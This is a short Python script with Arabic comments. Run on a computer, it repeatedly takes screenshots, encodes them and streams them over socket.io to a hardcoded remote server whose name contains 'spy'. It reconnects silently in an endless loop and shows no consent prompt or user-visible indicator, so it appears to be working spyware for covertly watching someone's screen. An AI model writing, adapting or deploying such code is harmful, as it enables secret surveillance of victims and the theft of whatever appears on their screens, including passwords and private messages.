import pyautogui
import io
import base64
import time
import socketio

class Client:
    def __init__(self):
        # تم تثبيت رابط السيرفر الخاص بك هنا تلقائياً
        self.server_url = "https://spy-game-t34n.onrender.com/"
        self.sio = socketio.Client()
        
        @self.sio.event
        def connect():
            print("[+] Connected to stream server successfully!")

        @self.sio.event
        def disconnect():
            print("[-] Disconnected from server. Retrying...")

    def capture_screen(self):
        # التقاط الشاشة وبثها بجودة مضغوطة للحصول على أعلى سرعة (FPS)
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='JPEG', quality=35)
        # تحويلها إلى نص لنقلها عبر السوكيت السريع
        return base64.b64encode(img_bytes.getvalue()).decode('utf-8')
    
    def start(self):
        while True:
            if not self.sio.connected:
                try:
                    self.sio.connect(self.server_url)
                except Exception:
                    time.sleep(3)
                    continue
            
            try:
                img_b64 = self.capture_screen()
                # إرسال الصورة عبر قنوات البث السريع
                self.sio.emit('video_stream', {'image': img_b64})
                # تأخير بسيط جداً (0.05 ثانية) ليعطي مظهر الفيديو السلس بدون ضغط السيرفر
                time.sleep(0.05)
            except Exception as e:
                print(f"[-] Stream error: {e}")
                time.sleep(2)

if __name__ == '__main__':
    client = Client()
    client.start()
